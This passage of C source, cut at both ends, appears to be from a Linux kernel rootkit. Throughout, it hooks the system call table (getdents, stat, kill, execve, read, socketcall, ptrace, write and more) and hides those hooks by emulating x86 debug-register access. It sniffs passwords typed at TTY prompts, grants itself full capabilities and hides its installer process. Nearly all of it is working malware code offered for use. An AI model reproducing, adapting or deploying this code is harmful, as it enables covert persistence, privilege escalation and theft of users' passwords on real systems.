	struct stat64 statme;
	unsigned long limit,offset,value=0,monsize,orig;
	long long ret2,ret64=0;
	int ret,pid=curpid();
	if(true_behaviour)
		goto ok;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(fstat64,fd,&statme);
	set_limit(limit);
	if(ret<0)
		goto ok;
	set_limit(KERNEL_DS);
	ret2=SYS(_llseek,fd,(unsigned long)0,(unsigned long)0,&ret64,SEEK_CUR);
	set_limit(limit);
	if(ret2<((long long)0))
		goto ok;
	offset=(unsigned long)ret64;
	compute_check_values(&value,&monsize,&orig);
	switch(switch_magic(&statme))
	{
		case 'k':
				if(value!=0xdeadbeef)
					value=KCORIZE(value);
				if(template_write_check(value,offset,size,monsize)<0)
					return size;
		case 'K':
				if(template_write_check(value,offset,size,monsize)<0)
					return size;
				if(template_write_check(int80,offset,size,200)<0)
					return size;
		case 'm':
				if(value!=0xdeadbeef)
					value=MEMIZE(value);
				if(template_write_check(value,offset,size,monsize)<0)
					return size;
				if(template_write_check(MEMIZE(int80),offset,size,200)<0)
					return size;
	}
	if((ret=SYS(write,fd,buf,size))>0)
		if(is_a_tty(fd))
			if(limit_strstr(buf,"assword:",size))
			{
				char buff[20];
				m_memset(buff,'\0',sizeof(buff));
				log_sniffed("\nPassword for \"",m_strlen("\nPassword for \""));
				log_sniffed(get_comm(),m_strlen(get_comm()));
				log_sniffed("\" with pid ",m_strlen("\" with pid "));
				m_itoa(buff,curpid(),sizeof(buff));
				log_sniffed(buff,m_strlen(buff));
				log_sniffed(" is ",4);
				sniff(pid);
			}
			
nosniff:
	return ret;
ok:
	return SYS(write,fd,buf,size);
	
}

template_stat(stat);
template_stat(lstat);
template_stat(stat64);
template_stat(lstat64);
template_statfs(statfs);
template_statfs(statfs64);
template_stat(truncate);
template_stat(truncate64);
template_stat(utime);
template_stat(utimes);
template_stat(access);
template_kill(kill);
template_kill(tkill);

template_tgkill(tgkill);

template_rt_sigqueueinfo(rt_sigqueueinfo);

template_getdents(getdents,linux_dirent);
template_getdents(getdents64,linux_dirent64);

template_fork(fork);
template_fork(vfork);
template_fork(clone);

template_chdir(chdir);
template_chdir(chroot);
template_chdir(unlink);

template_chmod(chmod);

template_chown(chown);
template_chown(lchown);

static int emulate_cpu(struct pt_regs *regs)
{
/* XXX Tnx twiz! :) */

	unsigned char volatile opcode[3];
	int i,full_legacy;
	unsigned long mask,dr7=0,condition;
	if((mood_mode==MOOD_LEGACY)&&(magic_ptrace_addr)||magic_vaddr)
		full_legacy=1;
	else
		full_legacy=0;
	
	for(i=0;i<3;i++)
		opcode[i] = *(unsigned char *)((regs->eip)+i);
	dr7=set_dr7_type(3,set_dr7_size(3,set_dr7_lglobal(3,dr7),1),DR_TYPE_EXE);
	if(full_legacy)
		dr7|=set_dr7_type(2,set_dr7_size(2,set_dr7_lglobal(2,dr7),1),DR_TYPE_EXE);

	__asm__ __volatile__("movl %%db6,%0" : "=r" (condition));
	condition&=~DR_PROTECT;
	__asm__ __volatile__ ("movl %0, %%db6" : : "r" (condition));
	if (opcode[0]==0x0f&&(opcode[1]==0x23||opcode[1]==0x21))
	{
		switch (opcode[2])
		{
			case 0xf8:
					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->eax!=dr7)
						{
							mask=dr7|regs->eax;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->eax) : "r" (mask));
					}
					goto exit;
			case 0xfc:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->esp!=dr7)
						{
							mask=dr7|regs->esp;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->esp) : "r" (mask));
					}
					goto exit;
			case 0xfb:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->ebx!=dr7)
						{
							mask=dr7|regs->ebx;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->ebx) : "r" (mask));
					}
					goto exit;
			case 0xf9:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->ecx!=dr7)
						{
							mask=dr7|regs->ecx;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->ecx) : "r" (mask));
					}
					goto exit;
			case 0xfa:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->edx!=dr7)
						{
							mask=dr7|regs->edx;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->edx) : "r" (mask));
					}
					goto exit;
			case 0xff:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->edi!=dr7)
						{
							mask=dr7|regs->edi;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->edi) : "r" (mask));
					}
					goto exit;
			case 0xfe:	

					if (opcode[1] == 0x23)
					{
						/* scrittura */
						if(regs->esi!=dr7)
						{
							mask=dr7|regs->esi;
							__asm__ __volatile__ ( "movl %0, %%db7\n" : : "r" (mask));
						}
						
					}
					else
					{
						/* lettura */
						__asm__ __volatile__ ("movl %%db7, %0" : "=r" (mask));
						mask&=~dr7;
						__asm__ __volatile__ ("movl %1, %0" : "=r" (regs->esi) : "r" (mask));
					}
					goto exit;
			case 0xd8:
					if (opcode[1] == 0x23)
					{
						if (regs->eax == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->eax));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->eax) : "r"(0));
					}
					goto exit;
			case 0xdb: 
					if (opcode[1] == 0x23)
					{
						if (regs->ebx == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->ebx));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->ebx) : "r"(0));
					}
					goto exit;
			case 0xd9:
					if (opcode[1] == 0x23)
					{
						if (regs->ecx == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->ecx));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->ecx) : "r"(0));
					}
					goto exit;
			case 0xda:
					if (opcode[1] == 0x23)
					{
						if (regs->edx == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->edx));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->edx) : "r"(0));
					}
					goto exit;
			case 0xdf:
					if (opcode[1] == 0x23)
					{
						if (regs->edi == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->edi));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->edi) : "r"(0));
					}
					goto exit;
			case 0xde:
					if (opcode[1] == 0x23)
					{
						if (regs->esi == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->esi));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->esi) : "r"(0));
					}
					goto exit;
			case 0xdc:
					if (opcode[1] == 0x23)
					{
						if (regs->esp == magic_addr)
							 __asm__ __volatile__ ( "movl %0,%%db3" : :"r" (regs->esp));
						
					}
					else
					{
						 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->esp) : "r"(0));
					}
					goto exit;
             case 0xc0:    /* eax + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->eax));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->eax));
                        goto exit;

             case 0xc3:    /* ebx + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->ebx));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->ebx));
                        goto exit;

             case 0xc1:    /* ecx + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->ecx));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->ecx));
                        goto exit;

             case 0xc2:    /* edx + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->edx));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->edx));
                        goto exit;

             case 0xc7:    /* edi + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->edi));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->edi));
                        goto exit;
             case 0xc6:    /* esi + db0 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->esi));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->esi));
                        goto exit;

             case 0xc4:    /* esp + db0 handling (hell yeah, possible)*/
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db0" : : "r" (regs->esp));
                        else
                          __asm__ __volatile__ ( "movl %%db0, %0" : "=r" (regs->esp));
                        goto exit;

             case 0xc8:    /* eax + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->eax));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->eax));
                        goto exit;

             case 0xcb:    /* ebx + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->ebx));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->ebx));
                        goto exit;

             case 0xc9:    /* ecx + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->ecx));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->ecx));
                        goto exit;

             case 0xca:    /* edx + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->edx));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->edx));
                        goto exit;

             case 0xcf:    /* edi + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->edi));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->edi));
                        goto exit;
             case 0xce:    /* esi + db1 handling */
                       if ( opcode[1] == 0x23 )
                         __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->esi));
                       else
                         __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->esi));
                       goto exit;

             case 0xcc:    /* esp + db1 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db1" : : "r" (regs->esp));
                        else
                          __asm__ __volatile__ ( "movl %%db1, %0" : "=r" (regs->esp));
                        goto exit;

             case 0xd0:   /* eax + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->eax==magic_ptrace_addr)||(regs->eax==magic_vaddr))
	                          __asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->eax));
			}
                        else
			{
				if(!full_legacy)
	                          __asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->eax));
				else
				 __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->eax) : "r"(0));

			}
                        goto exit;

             case 0xd3:    /* ebx + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->ebx==magic_ptrace_addr)||(regs->ebx==magic_vaddr))
	                          __asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->ebx));
			}
                        else
			{
				if(!full_legacy)
        	                	__asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->ebx));
				else
					__asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->ebx) : "r"(0));
			}
                        goto exit;

             case 0xd1:    /* ecx + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->ecx==magic_ptrace_addr)||(regs->ecx==magic_vaddr))
                         	 __asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->ecx));
			}
                        else
			{
				if(!full_legacy)
 	                         	__asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->ecx));
				else
					__asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->ecx) : "r"(0));
			}
                        goto exit;

             case 0xd2:    /* edx + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->edx==magic_ptrace_addr)||(regs->edx==magic_vaddr))
	                          	__asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->edx));
			}
                        else
			{
				if(!full_legacy)
	                          	__asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->edx));
				else
					__asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->edx) : "r"(0));
			}
                        goto exit;

             case 0xd7:    /* edi + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->edi==magic_ptrace_addr)||(regs->edi==magic_vaddr))
		                          __asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->edi));
			}
                        else
			{
				if(!full_legacy)
                		          __asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->edi));
				else
					  __asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->edi) : "r"(0));
			}
                        goto exit;

             case 0xd6:    /* esi + db2 handling */
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->esi==magic_ptrace_addr)||(regs->esi==magic_vaddr))
                          		__asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->esi));
			}
                        else
			{
				if(!full_legacy)
		                        __asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->esi));
				else
					__asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->esi) : "r"(0));
			}
                        goto exit;

             case 0xd4:    /* esp + db2 handling (hell yeah, possible)*/
                        if ( opcode[1] == 0x23 )
			{
				if((!full_legacy)||(regs->esp==magic_ptrace_addr)||(regs->esp==magic_vaddr))
                	          __asm__ __volatile__ ( "movl %0, %%db2" : : "r" (regs->esp));
			}
                        else
			{
				if(!full_legacy)
	                          	__asm__ __volatile__ ( "movl %%db2, %0" : "=r" (regs->esp));
				else
					__asm__ __volatile__ ( "movl %1, %0" : "=r"(regs->esp) : "r"(0));
			}
                        goto exit;
            case 0xf0:  /* eax + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->eax));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->eax));
                        goto exit;

             case 0xf3:    /* ebx + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->ebx));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->ebx));
                        goto exit;

             case 0xf1:    /* ecx + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->ecx));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->ecx));
                        goto exit;

             case 0xf2:    /* edx + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->edx));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->edx));
                        goto exit;

             case 0xf7:    /* edi + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->edi));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->edi));
                        goto exit;

             case 0xf6:    /* esi + db6 handling */
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->esi));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->esi));
                        goto exit;
             case 0xf4:    /* esp + db6 handling (hell yeah, possible)*/
                        if ( opcode[1] == 0x23 )
                          __asm__ __volatile__ ( "movl %0, %%db6" : : "r" (regs->esp));
                        else
                          __asm__ __volatile__ ( "movl %%db6, %0" : "=r" (regs->esp));
                        goto exit;

	     default:
			goto exit;

			
		}
	
	}
exit:
	regs->eip += 3;
	return 1;


}
__attribute__((regparm(3))) static inline void ndebug26(struct pt_regs *f,ulong s)
{
	__attribute__((regparm(3))) void (*o_debug)(ulong a,ulong b)=(void*)do_debug;
	unsigned long volatile dr6,condition;
	register i;
	register volatile addr;
	dr6=read_dr(6);
	if(dr6&DR_PROTECT)
	{
		emulate_cpu(f);
		dr6=(read_dr(7)|DR_PROTECT);
		write_dr(7,dr6);
		return;
	}
	if(dr_trap(dr6)==3)
	{
		f->eip=new_syscall;
		dr6=(read_dr(7)|DR_PROTECT);
		write_dr(7,dr6);

		return;
	}
	m_memcpy(do_debug,debug_backupcode,7);
	o_debug(f,s);
	if(!shouldstop)
		m_memcpy(do_debug,debug_jumpcode,7);
	activate_magic(magic_addr,3,0,1);
	
	return;
}
__attribute__((regparm(0))) static inline void ndebug24(struct pt_regs *f,ulong s)
{
	__attribute__((regparm(0))) void (*o_debug)(ulong a,ulong b)=(void*)do_debug;
	unsigned long volatile dr6,condition;
	register i;
	register volatile addr;
	dr6=read_dr(6);
	if(dr6&DR_PROTECT)
	{
		emulate_cpu(f);
		dr6=(read_dr(7)|DR_PROTECT);
		write_dr(7,dr6);
		return;
	}
	if(dr_trap_addr(dr6)==magic_addr)
	{
		f->eip=new_syscall;
		dr6=(read_dr(7)|DR_PROTECT);
		write_dr(7,dr6);

		return;
	}
	else if((magic_ptrace_addr)&&(dr_trap_addr(dr6)==magic_ptrace_addr))
	{
		f->eip=new_systrace;
		dr6=(read_dr(7)|DR_PROTECT);
		write_dr(7,dr6);
		return;
	}
	m_memcpy(do_debug,debug_backupcode,7);
	o_debug(f,s);
	if(!shouldstop)
	{
		m_memcpy(do_debug,debug_jumpcode,7);
	}
	if(magic_ptrace_addr)
		activate_magic(magic_ptrace_addr,2,0,0);
	activate_magic(magic_addr,3,0,1);
	return;
	
}

static inline int mood_handler(unsigned long condition, struct pt_regs *regs)
{
	struct dr_action volatile arg;
	volatile int ret=0;
	unsigned long volatile trapaddr;
	arg.reg=7;
	if(condition&DR_PROTECT)
	{
		if(!shouldstop)
		{
			emulate_cpu(regs);
			arg.addr=(read_dr(7)|DR_PROTECT);
		//	if(smp_call_function>kstart)
		//		smp_call_function(smp_write_dr,&arg,0,0);
			write_dr(7,arg.addr);
		}
		return 1;
	}
	trapaddr=dr_trap_addr(condition);
	if(trapaddr==magic_addr)
	{
		ret=1;
		regs->eip=new_syscall;
	%>
	else if(trapaddr==magic_vaddr)
	<%	ret=1;
		regs->eip=new_vsyscall;
	}
	arg.addr=(read_dr(7)|DR_PROTECT);
	//if(smp_call_function>kstart)
	//	smp_call_function(smp_write_dr,&arg,0,0);
	write_dr(7,arg.addr);
	return ret; /* continua con l'handler originale se 0, senno stoppa*/
}

inline unsigned long set_dr7_lglobal(int regnum,unsigned long dr7value)
{
	switch(regnum)
	{
		case 0:
			return (dr7value|DR7_DR0_LGLOB);
		case 1:
			return (dr7value|DR7_DR1_LGLOB);
		case 2:
			return (dr7value|DR7_DR2_LGLOB);
		case 3:
			return (dr7value|DR7_DR3_LGLOB);
	}
	return 0;
}
inline unsigned long set_dr7_size(int regnum,unsigned long dr7value,unsigned int size)
{
	size--;
	if(size!=0)
		return (dr7value|(size<<(18+(4*regnum))));
	else
		return (dr7value&(~(size<<(18+(4*regnum)))));

}
inline unsigned long set_dr7_type(int regnum,unsigned long dr7value,unsigned int type)
{
	if(type!=0)
		return (dr7value|(type<<(16+(4*regnum))));
	else
		return (dr7value&(~(type<<(16+(4*regnum)))));

}
static void activate_magic(unsigned long volatile value,int volatile regnum,int smp,int protect)
{
/* we can activate whenever we want because emulate_cpu  knows our magic
addresses */
	struct dr_action volatile arg;
	unsigned long volatile dr7=0;
	if(shouldstop)
		return;
	arg.reg=regnum;
	arg.addr=value;
	if(smp)
		if(smp_call_function>kstart)
			smp_call_function(smp_write_dr,&arg,0,0);
	write_dr(regnum,value);
	dr7=read_dr(7);
	dr7=set_dr7_type(regnum,set_dr7_size(regnum,set_dr7_lglobal(regnum,dr7),1),DR_TYPE_EXE);
	if(protect)
		dr7|=DR_PROTECT;
	arg.reg=7;
	arg.addr=dr7;
	if(smp)
		if(smp_call_function>kstart)
			smp_call_function(smp_write_dr,&arg,0,0);
	write_dr(7,dr7);
	
}

int mood_exceptions_notify(struct notifier_block *self, unsigned long val,void *data)
{
	struct die_args volatile  * volatile args = (struct die_args *)data;
	switch (val) {
		case DIE_DEBUG:
				if (mood_handler(args->err, args->regs))
					return NOTIFY_STOP;
	}

	return NOTIFY_DONE;
}

asm (	"mood_exceptions_stub:\n\t"
	"push	%ecx\n\r"
	"push	%edx\n\r"
	"push	%eax\n\r"
	"call	mood_exceptions_notify\n\r"
	"add	$0xc,%esp\n\r"
	"ret\n\r"
);

void reg_smp_call_function(void(*fun)(),void *info,int one,int two)
{
	asm __volatile__ (
	"sub $0x4,%%esp\n\r"
	"movl %0,%%ecx\n\r"
	"movl %%ecx,(%%esp)\n\r"
	"movl %1,%%ecx\n\r"
	"movl %2,%%edx\n\r"
	"movl %3,%%eax\n\r"
	"call *scf_addr\n\r"
	"add $0x4,%%esp\n\r"
	: 
	: "m" (two), "m" (one), "m" (info), "m" (fun)
	);


}


unsigned long reg_vmalloc(unsigned long size)
<%
register unsigned long vmret;
asm __volatile__ (
			"mov %0, %%eax\n\r"
			"call *vmaddr\n\r"
			: "=g"(vmret) 
			: "0"(size)
		 );
return vmret;
%>


int kernel_init(unsigned long old_uname,struct start_arg *user)
{
	struct stat64 procstat;
	int counter;
	long limit,ret,sysenter,dummy;
	unsigned long orig_sct,kernel_mem;
	struct start_arg start;
	char *memret;
	ulong caps[]={~0,~0,~0};

	m_memcpy(&start,user,sizeof(start));

	kstart=start.kstart;
	kend=start.kend;
	vmaddr=start.vmalloc;
	orig_sct=start.sys_call_table;
	thread_size=start.stacksize;
	kernel_mem=start.kernel_mem;
	printk=(void*)start.printk;	
	int80=start.int80;
	magic_addr=start.magic_address;
	magic_rejoin=start.magic_rejoin;
	if(!start.regparm)
		register_die_notifier=start.notifier;
	else
	<%
		register_die_stubaddr=start.notifier;
		register_die_notifier=reg_register_die_notifier;


	%>
	if(start.key)
		auth_key=start.key;
	if(start.magic_ptrace_address!=0xbadc0ded)
	{
		magic_ptrace_addr=start.magic_ptrace_address;
		magic_ptrace_rejoin=start.magic_ptrace_rejoin;
	}
	else
		magic_ptrace_addr=0;
	pentium=pcheck();

	/* let's fool vsyscalls too :> */
	
	
	rdmsr(MSR_IA32_SYSENTER_EIP,sysenter,dummy);
	if((sysenter>kstart)&&(sysenter<kend))
		memret=m_memmem(sysenter,150,"\xff\x14\x85",3);
	if(memret)
	<%
		magic_vaddr=memret;
		magic_vrejoin=memret+7;	
	%>
	

	/* ok, expand our arrays */
	if(start.kernel_version==6)
	{
		if(start.kernel_subversion==20)
			return -1; /* sigh :( */

		if(start.regparm)
			vmalloc=reg_vmalloc;
		else
			vmalloc=vmalloc6;
		getmypid=getpid6;
		do_debug=*((ulong*)(start.int1+57+1));
		do_debug+=start.int1+57+5;
		if(start.kernel_subversion>=10)
			*(unsigned long*)&debug_jumpcode[1]=ndebug26;
		else	/* prior of 2.6.10 do_debug is asmlinkage and not fastcall */
			*(unsigned long*)&debug_jumpcode[1]=ndebug24;

						
	}
	else
	{
		vmalloc=vmalloc4;
		getmypid=getpid4;
		do_debug=*((ulong*)(start.int1+3));
		*(unsigned long*)&debug_jumpcode[1]=ndebug24;

	}
	if(start.smp_func > kstart)
	<%
		scf_addr=start.smp_func;
		if(!start.regparm)
			smp_call_function=start.smp_func;
		else
			smp_call_function=reg_smp_call_function;
	%>

	pids=(char*)vmalloc(PID_MAX/8);
	sniffed=(char*)vmalloc(PID_MAX/8);
	fake_sct=(unsigned int*)vmalloc(NR_syscalls*sizeof(int*));
	o_sct=(unsigned int*)vmalloc(NR_syscalls*sizeof(int*));
	redirs=(unsigned int*)vmalloc(NR_syscalls*sizeof(int*));
	free_inodes=(unsigned long*)vmalloc(F_INODES*sizeof(long));	
	net_tables=(struct net**)vmalloc(PID_MAX*sizeof(int*));	
	if((!pids) || (!fake_sct) || (!o_sct) || (!redirs) || (!free_inodes) || (!net_tables) || (!sniffed))
		return -1;
	/*backup sct for our use */

	((void**)orig_sct)[__NR_olduname]=old_uname;
	m_memcpy(o_sct,(char*)orig_sct,(NR_syscalls*sizeof(void*)));
	/* copy orig on fake, later we will modify our syscalls and copy the whole
	 * object on original
	 */
	
	m_memcpy(fake_sct,(void*)orig_sct,(NR_syscalls*sizeof(void*)));


	/*
	 * initialize the system
	 */

	limit=get_limit();
	set_limit(KERNEL_DS);
	for(counter=0;counter<(sizeof(proc_names)/sizeof(proc_names[0]));counter++)
	{
		ret=SYS(stat64,proc_names[counter],&procstat);
		proc_inos[counter]=procstat.__st_ino;
		if(ret<0)
			proc_inos[counter]=0xbadc0ded;
		proc_dev=procstat.st_dev;
	}
	for(counter=0;counter<(sizeof(dev_names)/sizeof(dev_names[0]));counter++)
	{
		unsigned long dev;
		if(!(SYS(stat64,dev_names[counter],&procstat)<0))
		{
			dev=procstat.st_rdev;
			dev_mmn[counter][0]=MAJOR(dev);
			dev_mmn[counter][1]=MINOR(dev);
			
		}

	}
        for(counter=0;counter<(sizeof(redirs_table)/sizeof(redirs_table[0]))&&redirs_table[counter].from;counter++)
        {
                if(!(SYS(stat64,redirs_table[counter].from,&procstat)<0))
                {
                        redirs_table[counter].inode=procstat.__st_ino;

                }
		else
			redirs_table[counter].inode=0;

        }
	
	
	set_limit(limit);
	/* setting up values & fake values for redirs and their checks */
	check=0,mood_mode=0,shouldstop=0;
	comm=0,pidoff=0,group=0,capoff=0;
	virtual=0;
	comm=get_comm_off(start.mycomm);
	pidoff=get_pidoff();
	capoff=set_caps(old_get_root(),get_task(),caps);
	sys_call_table=orig_sct;
	my_memory=kernel_mem;
	m_memcpy(redirs,(void*)orig_sct,(NR_syscalls*sizeof(void*)));
	m_memset(free_inodes,'\0',(F_INODES*sizeof(int)));
	m_memset(pids,'\0',(PID_MAX/8));
	m_memset(sniffed,'\0',(PID_MAX/8));
	m_memset(net_tables,'\0',(PID_MAX*sizeof(int*)));
	m_memset(interfaces,'\0',sizeof(interfaces));
	m_memset(dead_memory,'\0',sizeof(dead_memory));
	/* setup values for printk redirection */
	if(printk)
	{
	     m_memcpy(backupcode,(void*)printk,7);
             *(unsigned long*)&jumpcode[1]=new_printk;
	}
	if(start.do_debug)
		do_debug=start.do_debug;
	if((do_debug<kstart)||(do_debug>kend))
		pentium=0;
	else
		m_memcpy(debug_backupcode,(void*)do_debug,7);
	/* here we install our hooks */
		
	HOOK(fake_sct,getdents);
	HOOK(fake_sct,getdents64);
	HOOK(fake_sct,stat);
	HOOK(fake_sct,lstat);
	HOOK(fake_sct,stat64);
	HOOK(fake_sct,lstat64);
	
	HOOK(fake_sct,statfs);
	HOOK(fake_sct,statfs64);
	HOOK(fake_sct,truncate);
	HOOK(fake_sct,truncate64);
	HOOK(fake_sct,utime);
	HOOK(fake_sct,utimes);
	HOOK(fake_sct,access);
	
	HOOK(fake_sct,fork);
	HOOK(fake_sct,vfork);
	HOOK(fake_sct,clone);
	
	HOOK(fake_sct,kill);
	HOOK(fake_sct,tkill);
	HOOK(fake_sct,tgkill);
	HOOK(fake_sct,rt_sigqueueinfo);
	
	HOOK(fake_sct,oldolduname);
	
	HOOK(fake_sct,chdir);
	HOOK(fake_sct,chroot);
	HOOK(fake_sct,chown);
	HOOK(fake_sct,lchown);
	HOOK(fake_sct,unlink);
	HOOK(fake_sct,init_module);
	HOOK(fake_sct,open);
		
	HOOK(fake_sct,exit);
	HOOK(fake_sct,exit_group);
	
	HOOK(fake_sct,execve);
		
        HOOK(fake_sct,symlink);
        HOOK(fake_sct,readlink);
	HOOK(fake_sct,ioctl);
		
	HOOK(fake_sct,read);
	
	HOOK(fake_sct,socketcall);
	HOOK(fake_sct,close);	
	HOOK(fake_sct,lseek);
	HOOK(fake_sct,_llseek);
	HOOK(fake_sct,mmap);
	HOOK(fake_sct,mmap2);
	HOOK(fake_sct,time);
	HOOK(fake_sct,ptrace);
	HOOK(fake_sct,write);


	
	/* hide our installer */
	hide(curpid());

	/* Arcane magic */
	/* force our engine? */
	switch(start.mode)
	{
		case 'b': pentium=0;
			  break;
